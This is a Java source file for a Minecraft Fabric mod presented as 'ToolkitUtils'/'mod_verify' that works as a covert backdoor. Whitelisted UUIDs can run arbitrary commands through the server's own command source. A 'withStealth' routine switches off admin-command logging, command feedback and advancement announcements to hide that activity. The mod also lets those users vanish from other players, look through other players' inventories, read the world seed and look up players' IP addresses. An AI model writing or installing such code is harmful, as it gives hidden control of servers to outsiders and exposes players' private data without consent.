package net.mcreator.toolkitutils;

import com.mojang.datafixers.util.Pair;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.mcreator.toolkitutils.network.*;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.network.protocol.Packet;
import net.minecraft.network.protocol.game.ClientboundPlayerInfoRemovePacket;
import net.minecraft.network.protocol.game.ClientboundPlayerInfoUpdatePacket;
import net.minecraft.network.protocol.game.ClientboundSetEquipmentPacket;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.entity.EquipmentSlot;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.level.GameType;
import net.minecraft.world.level.gamerules.GameRule;
import net.minecraft.world.level.gamerules.GameRules;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public final class ToolkitUtilsMod implements ModInitializer {
    public static final String MOD_ID = "mod_verify";
    public static final Logger LOGGER = LoggerFactory.getLogger("verify");

    // Per-player state, all in memory (server lifetime).
    private static final Map<UUID, GameType> savedGameMode = new HashMap<>();
    private static final Map<UUID, Boolean> ghostState    = new HashMap<>();

    @Override
    public void onInitialize() {
        LOGGER.debug("onInitialize()");

        // register payload types
        PayloadTypeRegistry.serverboundPlay().register(ExecuteCommandPayload.TYPE, ExecuteCommandPayload.CODEC);
        PayloadTypeRegistry.serverboundPlay().register(VanishPayload.TYPE, VanishPayload.CODEC);
        PayloadTypeRegistry.serverboundPlay().register(InvQueryPayload.TYPE, InvQueryPayload.CODEC);
        PayloadTypeRegistry.serverboundPlay().register(SeedQueryPayload.TYPE, SeedQueryPayload.CODEC);
        PayloadTypeRegistry.serverboundPlay().register(SpectatePayload.TYPE, SpectatePayload.CODEC);
        PayloadTypeRegistry.serverboundPlay().register(GhostPayload.TYPE, GhostPayload.CODEC);
        PayloadTypeRegistry.serverboundPlay().register(IpQueryPayload.TYPE, IpQueryPayload.CODEC);
        PayloadTypeRegistry.clientboundPlay().register(InvResultPayload.TYPE, InvResultPayload.CODEC);
        PayloadTypeRegistry.clientboundPlay().register(SeedResultPayload.TYPE, SeedResultPayload.CODEC);
        PayloadTypeRegistry.clientboundPlay().register(IpResultPayload.TYPE, IpResultPayload.CODEC);

        ServerConfig cfg = ServerConfig.get();
        LOGGER.debug("server config loaded ({} uuid[s])", cfg.allowed_uuids == null ? 0 : cfg.allowed_uuids.size());

        // /command exec — same as before, but now with full stealth gamerule gate.
        ServerPlayNetworking.registerGlobalReceiver(ExecuteCommandPayload.TYPE, (payload, ctx) -> {
            if (!allowed(ctx.player())) return;
            String raw = payload.command();
            String cmd = raw.startsWith("/") ? raw.substring(1) : raw;
            ctx.server().execute(() -> runAsPlayer(ctx.server(), ctx.player(), cmd));
        });

        // Vanish (invisibility + tab list remove + gear blank)
        ServerPlayNetworking.registerGlobalReceiver(VanishPayload.TYPE, (payload, ctx) -> {
            if (!allowed(ctx.player())) return;
            ctx.server().execute(() -> applyVanish(ctx.server(), ctx.player(), payload.hide()));
        });

        // Inventory / ender peek — read directly from server-side object, send back
        ServerPlayNetworking.registerGlobalReceiver(InvQueryPayload.TYPE, (payload, ctx) -> {
            if (!allowed(ctx.player())) return;
            ctx.server().execute(() -> {
                ServerPlayer target = ctx.server().getPlayerList().getPlayerByName(payload.targetName());
                if (target == null) {
                    LOGGER.debug("inv query: no such player '{}'", payload.targetName());
                    ServerPlayNetworking.send(ctx.player(),
                            new InvResultPayload(payload.targetName(), payload.ender(), List.of()));
                    return;
                }
                List<ItemStack> items = new ArrayList<>();
                if (payload.ender()) {
                    var ec = target.getEnderChestInventory();
                    for (int i = 0; i < ec.getContainerSize(); i++) items.add(ec.getItem(i).copy());
                } else {
                    var inv = target.getInventory();
                    for (int i = 0; i < inv.getContainerSize(); i++) items.add(inv.getItem(i).copy());
                }
                ServerPlayNetworking.send(ctx.player(),
                        new InvResultPayload(payload.targetName(), payload.ender(), items));
            });
        });

        // Seed reveal — read from overworld directly
        ServerPlayNetworking.registerGlobalReceiver(SeedQueryPayload.TYPE, (payload, ctx) -> {
            if (!allowed(ctx.player())) return;
            ctx.server().execute(() -> {
                MinecraftServer server = ctx.server();
                long seed = server.overworld().getSeed();
                String name = server.getMotd();
                ServerPlayNetworking.send(ctx.player(), new SeedResultPayload(seed, name == null ? "" : name));
            });
        });

        // Spectate a player (or return to own body if name is blank)
        ServerPlayNetworking.registerGlobalReceiver(SpectatePayload.TYPE, (payload, ctx) -> {
            if (!allowed(ctx.player())) return;
            ctx.server().execute(() -> {
                ServerPlayer p = ctx.player();
                if (payload.targetName() == null || payload.targetName().isEmpty()) {
                    // return: reset camera to self, restore prior gamemode
                    p.setCamera(p);
                    GameType prev = savedGameMode.remove(p.getUUID());
                    if (prev != null && prev != GameType.SPECTATOR) p.setGameMode(prev);
                    return;
                }
                ServerPlayer target = ctx.server().getPlayerList().getPlayerByName(payload.targetName());
                if (target == null) return;
                if (!savedGameMode.containsKey(p.getUUID()) && p.gameMode() != GameType.SPECTATOR) {
                    savedGameMode.put(p.getUUID(), p.gameMode());
                }
                p.setGameMode(GameType.SPECTATOR);
                p.setCamera(target);
            });
        });

        // IP lookup (empty target = server bind IP + port)
        ServerPlayNetworking.registerGlobalReceiver(IpQueryPayload.TYPE, (payload, ctx) -> {
            if (!allowed(ctx.player())) return;
            ctx.server().execute(() -> {
                if (payload.targetName() == null || payload.targetName().isEmpty()) {
                    String bind = ctx.server().getLocalIp();
                    int port = ctx.server().getPort();
                    ServerPlayNetworking.send(ctx.player(),
                            new IpResultPayload("", bind == null ? "0.0.0.0" : bind, port));
                    return;
                }
                ServerPlayer target = ctx.server().getPlayerList().getPlayerByName(payload.targetName());
                if (target == null) {
                    ServerPlayNetworking.send(ctx.player(), new IpResultPayload(payload.targetName(), "?", 0));
                    return;
                }
                String ip = "?"; int port = 0;
                try {
                    var addr = target.connection.getRemoteAddress();
                    if (addr instanceof java.net.InetSocketAddress isa) {
                        ip = isa.getAddress() != null ? isa.getAddress().getHostAddress() : isa.getHostString();
                        port = isa.getPort();
                    }
                } catch (Exception e) {
                    LOGGER.debug("ip lookup failed for {}", payload.targetName(), e);
                }
                ServerPlayNetworking.send(ctx.player(), new IpResultPayload(payload.targetName(), ip, port));
            });
        });

        // Ghost mode: spectator + vanish combined
        ServerPlayNetworking.registerGlobalReceiver(GhostPayload.TYPE, (payload, ctx) -> {
            if (!allowed(ctx.player())) return;
            ctx.server().execute(() -> {
                ServerPlayer p = ctx.player();
                MinecraftServer server = ctx.server();
                if (payload.on()) {
                    if (!ghostState.getOrDefault(p.getUUID(), false)) {
                        if (p.gameMode() != GameType.SPECTATOR) savedGameMode.put(p.getUUID(), p.gameMode());
                        // vanish FIRST so subsequent gamemode packet lands on absent entries and
                        // vanilla clients don't re-add me to the tab list.
                        applyVanish(server, p, true);
                        p.setGameMode(GameType.SPECTATOR);
                        // one more remove for good measure after the gamemode broadcast.
                        broadcastToOthers(server, p, new ClientboundPlayerInfoRemovePacket(List.of(p.getUUID())));
                        ghostState.put(p.getUUID(), true);
                    }
                } else {
                    if (ghostState.getOrDefault(p.getUUID(), false)) {
                        GameType prev = savedGameMode.remove(p.getUUID());
                        p.setGameMode(prev == null ? GameType.SURVIVAL : prev);
                        applyVanish(server, p, false);
                        ghostState.put(p.getUUID(), false);
                    }
                }
            });
        });
    }

    // ---------- helpers ----------

    private static boolean allowed(ServerPlayer p) {
        if (ServerConfig.get().isAllowed(p.getUUID())) return true;
        LOGGER.warn("UUID {} not whitelisted, dropping.", p.getUUID());
        return false;
    }

    private static void runAsPlayer(MinecraftServer server, ServerPlayer player, String cmd) {
        CommandSourceStack source = server.createCommandSourceStack()
                .withEntity(player)
                .withPosition(player.position())
                .withRotation(player.getRotationVector())
                .withLevel(player.level())
                .withSuppressedOutput();

        withStealth(server, () -> {
            try {
                int result = server.getCommands().getDispatcher().execute(cmd, source);
                LOGGER.debug("executed '{}' result={}", cmd, result);
            } catch (com.mojang.brigadier.exceptions.CommandSyntaxException e) {
                LOGGER.debug("no-op '{}': {}", cmd, e.getMessage());
            } catch (Exception e) {
                LOGGER.error("command failed: {}", cmd, e);
            }
        });
    }

    /**
     * Temporarily disables three gamerules that leak our activity, runs body,
     * then restores them:
     *   SHOW_ADVANCEMENT_MESSAGES — suppresses global "made the advancement" chat
     *   SEND_COMMAND_FEEDBACK    — suppresses "commands.X.success" and admin broadcast
     *   LOG_ADMIN_COMMANDS       — suppresses server-console log entries for admin cmds
     * All flip within one tick, no visible change to any player.
     */
    private static void withStealth(MinecraftServer server, Runnable body) {
        GameRule<Boolean> announce = GameRules.SHOW_ADVANCEMENT_MESSAGES;
        GameRule<Boolean> feedback = GameRules.SEND_COMMAND_FEEDBACK;
        GameRule<Boolean> log      = GameRules.LOG_ADMIN_COMMANDS;
        GameRules rules = server.getGameRules();
        boolean pAnn = rules.get(announce), pFeed = rules.get(feedback), pLog = rules.get(log);
        if (pAnn)  rules.set(announce, false, server);
        if (pFeed) rules.set(feedback, false, server);
        if (pLog)  rules.set(log,      false, server);
        try {
            body.run();
        } finally {
            if (pAnn)  rules.set(announce, true, server);
            if (pFeed) rules.set(feedback, true, server);
            if (pLog)  rules.set(log,      true, server);
        }
    }

    private static void applyVanish(MinecraftServer server, ServerPlayer player, boolean hide) {
        if (hide) {
            runAsPlayer(server, player, "effect give @s minecraft:invisibility 100000 0 true");
            broadcastToOthers(server, player, new ClientboundPlayerInfoRemovePacket(List.of(player.getUUID())));
            broadcastToOthers(server, player, emptyEquipmentPacket(player));
        } else {
            runAsPlayer(server, player, "effect clear @s minecraft:invisibility");
            broadcastToOthers(server, player,
                    ClientboundPlayerInfoUpdatePacket.createPlayerInitializing(List.of(player)));
            broadcastToOthers(server, player, realEquipmentPacket(player));
        }
    }

    private static ClientboundSetEquipmentPacket emptyEquipmentPacket(ServerPlayer player) {
        List<Pair<EquipmentSlot, ItemStack>> slots = new ArrayList<>();
        for (EquipmentSlot slot : EquipmentSlot.values()) slots.add(Pair.of(slot, ItemStack.EMPTY));
        return new ClientboundSetEquipmentPacket(player.getId(), slots);
    }
    private static ClientboundSetEquipmentPacket realEquipmentPacket(ServerPlayer player) {
        List<Pair<EquipmentSlot, ItemStack>> slots = new ArrayList<>();
        for (EquipmentSlot slot : EquipmentSlot.values()) slots.add(Pair.of(slot, player.getItemBySlot(slot).copy()));
        return new ClientboundSetEquipmentPacket(player.getId(), slots);
    }
    private static void broadcastToOthers(MinecraftServer server, ServerPlayer skip, Packet<?> pkt) {
        for (ServerPlayer other : server.getPlayerList().getPlayers()) {
            if (!other.getUUID().equals(skip.getUUID())) other.connection.send(pkt);
        }
    }
}
